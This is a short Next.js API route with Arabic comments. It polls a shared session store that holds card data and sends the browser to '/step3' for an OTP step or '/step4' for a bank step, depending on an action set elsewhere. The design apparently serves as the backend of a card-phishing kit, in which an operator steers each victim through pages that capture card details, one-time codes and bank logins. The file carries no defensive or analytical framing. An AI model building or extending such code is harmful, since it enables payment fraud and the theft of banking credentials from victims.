import type { NextApiRequest, NextApiResponse } from 'next';

// استخدام global sessions المشتركة
declare global {
  var __sessions: Record<string, { action: string | null; timestamp: number; cardData?: any }> | undefined;
}

if (!global.__sessions) {
  global.__sessions = {};
}

const sessions = global.__sessions;

export default function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method !== 'GET') {
    return res.status(405).json({ success: false, error: 'Method not allowed' });
  }

  const { sessionId } = req.query;

  if (!sessionId || typeof sessionId !== 'string') {
    return res.status(400).json({ redirect: null });
  }

  const session = sessions[sessionId];

  if (session && session.action) {
    const action = session.action;
    session.action = null; // مسح الإجراء بعد الاستخدام

    if (action === 'redirect_otp') {
      return res.status(200).json({ redirect: '/step3' });
    } else if (action === 'redirect_bank') {
      return res.status(200).json({ redirect: '/step4' });
    }
  }

  res.status(200).json({ redirect: null });
}
